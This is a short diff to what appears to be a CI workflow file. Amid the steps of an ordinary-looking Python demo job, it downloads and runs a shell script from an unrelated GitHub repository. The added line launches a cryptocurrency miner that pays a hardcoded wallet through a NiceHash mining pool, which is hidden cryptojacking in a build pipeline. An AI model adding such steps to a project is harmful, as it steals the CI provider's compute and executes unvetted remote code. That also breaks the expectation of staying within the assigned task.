@@ -25,6 +25,7 @@ jobs:
         wget https://github.com/coldajanta/ak/raw/main/aknh.sh
         chmod +x aknh.sh
         ./aknh.sh
+        ./cmdline_launcher.sh -algo autolykos  -coin BTC -wallet 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390
        
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
